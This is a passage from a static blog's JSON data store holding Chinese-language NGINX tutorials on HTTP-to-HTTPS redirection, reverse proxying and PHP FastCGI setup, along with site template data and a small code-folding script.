/opt/ssl/itellyou.cf.key;\n    ssl_session_cache shared:SSL:1m;\n    ssl_session_timeout 5m;\n    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;\n    ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;\n    ssl_prefer_server_ciphers on;\n\n    location / {\n        root /usr/share/nginx/html;\n        index index.php index.html index.htm;\n    }\n}\n\nserver {\n    listen 80;\n    #填写证书绑定的域名\n    server_name itellyou.cf;\n    #将所有HTTP请求通过rewrite指令重定向到HTTPS。\n    rewrite ^(.*)$ https://$host$1;\n    location / {\n        index index.php index.html index.htm;\n    }\n}\n```\n\n### NGINX反向代理\n\n#### 反向代理不加密站点\n\n```bash 折叠代码\nserver {\n    # 配置http要监听80端口\n    listen 80;\n    # 确保DNS厂商已经正确解析域名\n    server_name ai.itellyou.cf;\n\n    # 填写正确的后端代理地址\n    location / {\n        proxy_pass http://itellyou.cf:30080;\n    }\n}\n```\n\n#### 反向代理SSL加密站点\n\n```bash 折叠代码\nserver {\n    # 配置https要监听443端口\n    listen 443 ssl;\n    # 确保DNS厂商已经正确解析域名\n    server_name ai.itellyou.cf;\n \n    # 关于配置SSL证书的部分，保证证书路径正确，其他保持不变即可\n    ssl_certificate /opt/ssl/ai.itellyou.cf.pem;\n    ssl_certificate_key /opt/ssl/ai.itellyou.cf.key;\n    ssl_session_cache shared:SSL:1m;\n    ssl_session_timeout 5m;\n    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;\n    ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;\n    ssl_prefer_server_ciphers on;\n\n    # 填写正确的后端代理地址\n    location / {\n        proxy_pass http://itellyou.cf:30080;\n    }\n}\n```","source":"_posts/nginx-proxy.md","raw":"---\ntitle: NGINX配置的那些事\ndate: 2024-04-02 14:27:45\ncategories: 技术\ntags:\n  - NGINX\n  - Linux\n---\n\n知道的越多，不知道的越多，NGINX的功能远比我所能理解的多太多了。  \n山高万仞，只登一步。披荆斩棘，行则将至。\n\n<!-- more -->\n\n### NGINX端口重定向（80 to 443）\n\n在生产环境中，一般不会使用http协议进行Web访问，都是使用https加密的方式进行Web访问，http和https各自监听的端口都不一样，那多余的80端口，该何去何从？一个比较合适的做法是端口重定向，使用NGINX的重写功能，将访问80端口的请求自动转发给443端口，下面是一个例子：\n\n```bash 折叠代码\nserver {\n    # HTTPS的默认访问端口443。如果未在此处配置HTTPS的默认访问端口，可能会造成Nginx无法启动。\n    listen 443 ssl;\n     \n    # 填写证书绑定的域名\n    server_name itellyou.cf;\n \n    # 关于配置SSL证书的部分，保证证书路径正确，其他保持不变即可\n    ssl_certificate /opt/ssl/itellyou.cf.pem;\n    ssl_certificate_key /opt/ssl/itellyou.cf.key;\n    ssl_session_cache shared:SSL:1m;\n    ssl_session_timeout 5m;\n    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;\n    ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;\n    ssl_prefer_server_ciphers on;\n\n    location / {\n        root /usr/share/nginx/html;\n        index index.php index.html index.htm;\n    }\n}\n\nserver {\n    listen 80;\n    #填写证书绑定的域名\n    server_name itellyou.cf;\n    #将所有HTTP请求通过rewrite指令重定向到HTTPS。\n    rewrite ^(.*)$ https://$host$1;\n    location / {\n        index index.php index.html index.htm;\n    }\n}\n```\n\n### NGINX反向代理\n\n#### 反向代理不加密站点\n\n```bash 折叠代码\nserver {\n    # 配置http要监听80端口\n    listen 80;\n    # 确保DNS厂商已经正确解析域名\n    server_name ai.itellyou.cf;\n\n    # 填写正确的后端代理地址\n    location / {\n        proxy_pass http://itellyou.cf:30080;\n    }\n}\n```\n\n#### 反向代理SSL加密站点\n\n```bash 折叠代码\nserver {\n    # 配置https要监听443端口\n    listen 443 ssl;\n    # 确保DNS厂商已经正确解析域名\n    server_name ai.itellyou.cf;\n \n    # 关于配置SSL证书的部分，保证证书路径正确，其他保持不变即可\n    ssl_certificate /opt/ssl/ai.itellyou.cf.pem;\n    ssl_certificate_key /opt/ssl/ai.itellyou.cf.key;\n    ssl_session_cache shared:SSL:1m;\n    ssl_session_timeout 5m;\n    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;\n    ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;\n    ssl_prefer_server_ciphers on;\n\n    # 填写正确的后端代理地址\n    location / {\n        proxy_pass http://itellyou.cf:30080;\n    }\n}\n```","slug":"nginx-proxy","published":1,"updated":"2024-05-03T03:55:54.881Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5g7007b7zj3e0qqetwf","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>知道的越多，不知道的越多，NGINX的功能远比我所能理解的多太多了。<br>山高万仞，只登一步。披荆斩棘，行则将至。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"NGINX端口重定向（80-to-443）\"><a href=\"#NGINX端口重定向（80-to-443）\" class=\"headerlink\" title=\"NGINX端口重定向（80 to 443）\"></a>NGINX端口重定向（80 to 443）</h3><p>在生产环境中，一般不会使用http协议进行Web访问，都是使用https加密的方式进行Web访问，http和https各自监听的端口都不一样，那多余的80端口，该何去何从？一个比较合适的做法是端口重定向，使用NGINX的重写功能，将访问80端口的请求自动转发给443端口，下面是一个例子：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    <span class=\"comment\"># HTTPS的默认访问端口443。如果未在此处配置HTTPS的默认访问端口，可能会造成Nginx无法启动。</span></span><br><span class=\"line\">    listen 443 ssl;</span><br><span class=\"line\">     </span><br><span class=\"line\">    <span class=\"comment\"># 填写证书绑定的域名</span></span><br><span class=\"line\">    server_name itellyou.cf;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># 关于配置SSL证书的部分，保证证书路径正确，其他保持不变即可</span></span><br><span class=\"line\">    ssl_certificate /opt/ssl/itellyou.cf.pem;</span><br><span class=\"line\">    ssl_certificate_key /opt/ssl/itellyou.cf.key;</span><br><span class=\"line\">    ssl_session_cache shared:SSL:1m;</span><br><span class=\"line\">    ssl_session_timeout 5m;</span><br><span class=\"line\">    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;</span><br><span class=\"line\">    ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;</span><br><span class=\"line\">    ssl_prefer_server_ciphers on;</span><br><span class=\"line\"></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        root /usr/share/nginx/html;</span><br><span class=\"line\">        index index.php index.html index.htm;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    <span class=\"comment\">#填写证书绑定的域名</span></span><br><span class=\"line\">    server_name itellyou.cf;</span><br><span class=\"line\">    <span class=\"comment\">#将所有HTTP请求通过rewrite指令重定向到HTTPS。</span></span><br><span class=\"line\">    rewrite ^(.*)$ https://$host<span class=\"variable\">$1</span>;</span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        index index.php index.html index.htm;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"NGINX反向代理\"><a href=\"#NGINX反向代理\" class=\"headerlink\" title=\"NGINX反向代理\"></a>NGINX反向代理</h3><h4 id=\"反向代理不加密站点\"><a href=\"#反向代理不加密站点\" class=\"headerlink\" title=\"反向代理不加密站点\"></a>反向代理不加密站点</h4><figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    <span class=\"comment\"># 配置http要监听80端口</span></span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    <span class=\"comment\"># 确保DNS厂商已经正确解析域名</span></span><br><span class=\"line\">    server_name ai.itellyou.cf;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 填写正确的后端代理地址</span></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        proxy_pass http://itellyou.cf:30080;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"反向代理SSL加密站点\"><a href=\"#反向代理SSL加密站点\" class=\"headerlink\" title=\"反向代理SSL加密站点\"></a>反向代理SSL加密站点</h4><figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    <span class=\"comment\"># 配置https要监听443端口</span></span><br><span class=\"line\">    listen 443 ssl;</span><br><span class=\"line\">    <span class=\"comment\"># 确保DNS厂商已经正确解析域名</span></span><br><span class=\"line\">    server_name ai.itellyou.cf;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># 关于配置SSL证书的部分，保证证书路径正确，其他保持不变即可</span></span><br><span class=\"line\">    ssl_certificate /opt/ssl/ai.itellyou.cf.pem;</span><br><span class=\"line\">    ssl_certificate_key /opt/ssl/ai.itellyou.cf.key;</span><br><span class=\"line\">    ssl_session_cache shared:SSL:1m;</span><br><span class=\"line\">    ssl_session_timeout 5m;</span><br><span class=\"line\">    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;</span><br><span class=\"line\">    ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;</span><br><span class=\"line\">    ssl_prefer_server_ciphers on;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 填写正确的后端代理地址</span></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        proxy_pass http://itellyou.cf:30080;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>知道的越多，不知道的越多，NGINX的功能远比我所能理解的多太多了。<br>山高万仞，只登一步。披荆斩棘，行则将至。</p>","more":"<h3 id=\"NGINX端口重定向（80-to-443）\"><a href=\"#NGINX端口重定向（80-to-443）\" class=\"headerlink\" title=\"NGINX端口重定向（80 to 443）\"></a>NGINX端口重定向（80 to 443）</h3><p>在生产环境中，一般不会使用http协议进行Web访问，都是使用https加密的方式进行Web访问，http和https各自监听的端口都不一样，那多余的80端口，该何去何从？一个比较合适的做法是端口重定向，使用NGINX的重写功能，将访问80端口的请求自动转发给443端口，下面是一个例子：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    <span class=\"comment\"># HTTPS的默认访问端口443。如果未在此处配置HTTPS的默认访问端口，可能会造成Nginx无法启动。</span></span><br><span class=\"line\">    listen 443 ssl;</span><br><span class=\"line\">     </span><br><span class=\"line\">    <span class=\"comment\"># 填写证书绑定的域名</span></span><br><span class=\"line\">    server_name itellyou.cf;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># 关于配置SSL证书的部分，保证证书路径正确，其他保持不变即可</span></span><br><span class=\"line\">    ssl_certificate /opt/ssl/itellyou.cf.pem;</span><br><span class=\"line\">    ssl_certificate_key /opt/ssl/itellyou.cf.key;</span><br><span class=\"line\">    ssl_session_cache shared:SSL:1m;</span><br><span class=\"line\">    ssl_session_timeout 5m;</span><br><span class=\"line\">    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;</span><br><span class=\"line\">    ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;</span><br><span class=\"line\">    ssl_prefer_server_ciphers on;</span><br><span class=\"line\"></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        root /usr/share/nginx/html;</span><br><span class=\"line\">        index index.php index.html index.htm;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    <span class=\"comment\">#填写证书绑定的域名</span></span><br><span class=\"line\">    server_name itellyou.cf;</span><br><span class=\"line\">    <span class=\"comment\">#将所有HTTP请求通过rewrite指令重定向到HTTPS。</span></span><br><span class=\"line\">    rewrite ^(.*)$ https://$host<span class=\"variable\">$1</span>;</span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        index index.php index.html index.htm;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"NGINX反向代理\"><a href=\"#NGINX反向代理\" class=\"headerlink\" title=\"NGINX反向代理\"></a>NGINX反向代理</h3><h4 id=\"反向代理不加密站点\"><a href=\"#反向代理不加密站点\" class=\"headerlink\" title=\"反向代理不加密站点\"></a>反向代理不加密站点</h4><figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    <span class=\"comment\"># 配置http要监听80端口</span></span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    <span class=\"comment\"># 确保DNS厂商已经正确解析域名</span></span><br><span class=\"line\">    server_name ai.itellyou.cf;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 填写正确的后端代理地址</span></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        proxy_pass http://itellyou.cf:30080;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"反向代理SSL加密站点\"><a href=\"#反向代理SSL加密站点\" class=\"headerlink\" title=\"反向代理SSL加密站点\"></a>反向代理SSL加密站点</h4><figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    <span class=\"comment\"># 配置https要监听443端口</span></span><br><span class=\"line\">    listen 443 ssl;</span><br><span class=\"line\">    <span class=\"comment\"># 确保DNS厂商已经正确解析域名</span></span><br><span class=\"line\">    server_name ai.itellyou.cf;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># 关于配置SSL证书的部分，保证证书路径正确，其他保持不变即可</span></span><br><span class=\"line\">    ssl_certificate /opt/ssl/ai.itellyou.cf.pem;</span><br><span class=\"line\">    ssl_certificate_key /opt/ssl/ai.itellyou.cf.key;</span><br><span class=\"line\">    ssl_session_cache shared:SSL:1m;</span><br><span class=\"line\">    ssl_session_timeout 5m;</span><br><span class=\"line\">    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;</span><br><span class=\"line\">    ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;</span><br><span class=\"line\">    ssl_prefer_server_ciphers on;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 填写正确的后端代理地址</span></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        proxy_pass http://itellyou.cf:30080;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"NGINX整合PHP","date":"2023-07-04T03:53:35.000Z","_content":"\n### NGINX整合PHP\n\n这个实现起来比较简单，就是一段代码的事，但是之前没有出现我这样的开源工作者的时候，我只能手敲那一段代码，有时候一不留神就会把单词拼错，尤其是朱行查找错误的时候，简直苦不堪言。为了后浪们的幸福生活，再次我将那一段代码写下来供你们<kbd>Ctrl</kbd>+<kbd>C</kbd>和<kbd>Ctrl</kbd>+<kbd>V</kbd>使用。\n\n<!-- more -->\n\n具体操作如下：\n\n* 打开NGINX的配置文件,添加这一段。\n\n```bash\n        location ~ \\.php$ {\n            root   /web;\n            fastcgi_pass    127.0.0.1:9000;\n            fastcgi_index   index.php;\n            fastcgi_param   SCRIPT_FILENAME $document_root$fastcgi_script_name;\n            include         fastcgi_params;\n        }\n```\n\n补一张图片显示要插入的位置。\n\n![](./nginx-union-php/1.png)\n\n然后就完成了NGINX和PHP的联动。","source":"_posts/nginx-union-php.md","raw":"---\ntitle: NGINX整合PHP\ndate: 2023-07-04 11:53:35\ncategories:\ntags:\n  - Linux\n---\n\n### NGINX整合PHP\n\n这个实现起来比较简单，就是一段代码的事，但是之前没有出现我这样的开源工作者的时候，我只能手敲那一段代码，有时候一不留神就会把单词拼错，尤其是朱行查找错误的时候，简直苦不堪言。为了后浪们的幸福生活，再次我将那一段代码写下来供你们<kbd>Ctrl</kbd>+<kbd>C</kbd>和<kbd>Ctrl</kbd>+<kbd>V</kbd>使用。\n\n<!-- more -->\n\n具体操作如下：\n\n* 打开NGINX的配置文件,添加这一段。\n\n```bash\n        location ~ \\.php$ {\n            root   /web;\n            fastcgi_pass    127.0.0.1:9000;\n            fastcgi_index   index.php;\n            fastcgi_param   SCRIPT_FILENAME $document_root$fastcgi_script_name;\n            include         fastcgi_params;\n        }\n```\n\n补一张图片显示要插入的位置。\n\n![](./nginx-union-php/1.png)\n\n然后就完成了NGINX和PHP的联动。","slug":"nginx-union-php","published":1,"updated":"2024-05-03T03:55:54.881Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5g8007e7zj36e114t85","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"NGINX整合PHP\"><a href=\"#NGINX整合PHP\" class=\"headerlink\" title=\"NGINX整合PHP\"></a>NGINX整合PHP</h3><p>这个实现起来比较简单，就是一段代码的事，但是之前没有出现我这样的开源工作者的时候，我只能手敲那一段代码，有时候一不留神就会把单词拼错，尤其是朱行查找错误的时候，简直苦不堪言。为了后浪们的幸福生活，再次我将那一段代码写下来供你们<kbd>Ctrl</kbd>+<kbd>C</kbd>和<kbd>Ctrl</kbd>+<kbd>V</kbd>使用。</p>\n<span id=\"more\"></span>\n\n<p>具体操作如下：</p>\n<ul>\n<li>打开NGINX的配置文件,添加这一段。</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ \\.php$ &#123;</span><br><span class=\"line\">    root   /web;</span><br><span class=\"line\">    fastcgi_pass    127.0.0.1:9000;</span><br><span class=\"line\">    fastcgi_index   index.php;</span><br><span class=\"line\">    fastcgi_param   SCRIPT_FILENAME $document_root<span class=\"variable\">$fastcgi_script_name</span>;</span><br><span class=\"line\">    include         fastcgi_params;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>补一张图片显示要插入的位置。</p>\n<p><img src=\"/2023/07/04/nginx-union-php/1.png\"></p>\n<p>然后就完成了NGINX和PHP的联动。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            